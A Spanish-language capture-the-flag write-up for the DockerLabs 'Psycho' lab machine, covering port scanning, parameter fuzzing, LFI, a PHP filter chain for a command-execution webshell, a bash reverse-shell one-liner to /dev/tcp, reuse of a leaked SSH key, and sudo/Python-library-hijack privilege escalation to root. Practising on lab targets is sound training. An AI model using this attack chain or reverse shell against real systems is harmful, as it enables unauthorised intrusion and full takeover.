- Tags: #Pysicho
---
# Aprendizaje en Psycho
El laboratorio Psycho de DockerLabs es un entorno vulnerable en Linux donde se practican técnicas básicas de hacking ético. Incluye enumeración de servicios, explotación de una vulnerabilidad LFI, acceso mediante clave SSH filtrada y escalada de privilegios usando sudo.

[Maquina Psyicho](https://mega.nz/file/MSkgWDKJ#UHmAFBkvOpAc9fPIDocrVDLYz0VY6BolhLz87f3tSNM) ==> Enlace de descarga al laboratorio 
```bash
7z x psycho.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh psycho.tar # Desplegamos el proyecto.
```
---

#### Fase Reconocimiento:
**( 172.17.0.2 )** ==> Direccion IP del target.
```bash
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para ver si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Deteccion Puertos:
```bash
 nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos expuestos en el target
 extractPorts allPorts # Parseamos toda la informacion mas relevante
  nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos
```
---
- **( 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0) )** ==> Tenemos un servicio ssh expuesto, que podremos enumerar si podemos encontrar usuario filtrados
- **( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** ==> Tenemos un servicio apache desplegado el cual tendremos que auditar.
- **( Apache httpd 2.4.58 )** ==> Por el **codeName** podemos determinar que estamos ante una posible version de **ubuntuNoble**

#### Fase Reconocimiento Web:
```bash
nmap -p22 --script http-enum 172.17.0.2 # No nos reporta nada critido

whatweb 172.17.0.2 # Realizamos deteccion de tecnologias usadas por la web
	http://172.17.0.2 [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[4You]
```
---

#### Fase Reconocimiento Rutas:
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash # Detectamos un directorio
```
---
**( http://172.17.0.2 )** ==> Tenemos un posible usuario: **( Tluisillo / luisillo )**
**( http://172.17.0.2/assets/ )** ==> Este directorio contempla una imagen, La descargaremos para ver si tiene archivos adjuntos.
**Nota** ==> Detectamos un posible error en la pagina, Sabiendo que es un: **( index.php )** podemos probar **fuzzeando** la url para detectar en caso de que este llamando a algun parametro
```bash
wfuzz -c --hw 169 -t 20 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt "http://172.17.0.2/index.php?FUZZ"

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================
000004819:   500        62 L     166 W      2582 Ch     "secret"    # Detectamos este  parametro que nos permitiria apuntar a recurso internos en caso de que logremos explotar un LFI
```
---
**( view-source:http://172.17.0.2/index.php?secret=../../../etc/passwd )** ==> Logramos acontecer un **LFI**, Listando el archivo **passwd** tenemos un usuario **luisillo** que despues podemos intentar vulnerar,
**Nota** ==> Interceptamos la peticion, Con **burpSuite** para intentar explotar la url, De todas las pruebas que realizamos logrmos ejecutar comandos con esta herramienta explotando el parametro: **( secret )** que es donde inyectamos la instruccion que no ayuda a generar esta herramienta
 #### Uso php Filter Chain Generator:
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
```
---
- **@** Ejecutamos el siguiente comando para ver su modo de uso:
```python
python3 php_filter_chain_generator.py -h
```
---
- **--chains** ==> Permite pasarle una cadena que nos interesa generar quedando de la siguiente manera:
```python
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```
---
- ahora que hemos logrado ejecutar comandos, Tendremos que ganar acceso. Asi mismo realizaremos una instruccion php para poder controlar el comando con la misma herramienta
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]) ?>' # Para poder controlar el comando.
```
---
**Nota** ==> Ya que o tenemos nombres de usuarios probaremos con fuerza bruta al puerto SSH con uno de estos usuarios, pero no obtenemos algún resultado favorable. Probamos revisando algunos archivos `.log`, no obtenemos ningún resultado. Buscamos archivos comunes de los usuarios y para el usuario `vaxei` podemos obtener su archivo `id_rsa`.
#### Intrusion
**Nota** ==> Desde **burpSuite** tenemos el control del comando que queremos ejecutar ahora toca ganar acceso a la maquina, 
```bash
nc -nlvp 443

bash -c 'exec bash -i &>/dev/tcp/192.168.100.22/443 <&1' # Tendremos que urlEncodear en caso de que nos de problema el & y ejecutamos la isntruccion, Y tenemos que urlencodear la instruccion
```
---
Logramos ganar acceso a la maquina como el usuario **www-data**

#### Escalada Privilegios.
**( /home/vaxei/.ssh )** ==> Podemos acceder a este usuario y ver sus claves **ssh** para poder intentar migrar por este usuario.
```bash
ssh -i id_rsa vaxei@localhost  # Migramos a este usuario:
```
---
```bash
sudo -l # Listamos los permisos y este usuario puede ejecutar el binario de perl, sin proporcional password
User vaxei may run the following commands on 989a528dbbf1:
    (luisillo) NOPASSWD: /usr/bin/perl
```
---
```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash -p";' # Obtuvimos una shell si privilegios como este usuario pero ahora logramos migrar a este usaurio ( luisillo )
```
---
```bash
sudo -l

User luisillo may run the following commands on 989a528dbbf1: # Tenemos una via potencial de elevar privilegios a root por el binario de python
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```
---
**( export PATH=/opt:$PATH )** ==> Realizamos esta modificacon para secuestrar el path de python, ya que el script: **( paw.py )** necesita el modulo **subprocess.py** crearemos una igual en **( /opt )** para poder secuestrar la libreria.
```bash
import os;
os.system("chmod u+s /bin/bash")
```
---
- Ahora hemos logrado cambiarle los permisos de la bash,
```bash
bash -p # Migramos al usuario root. 
```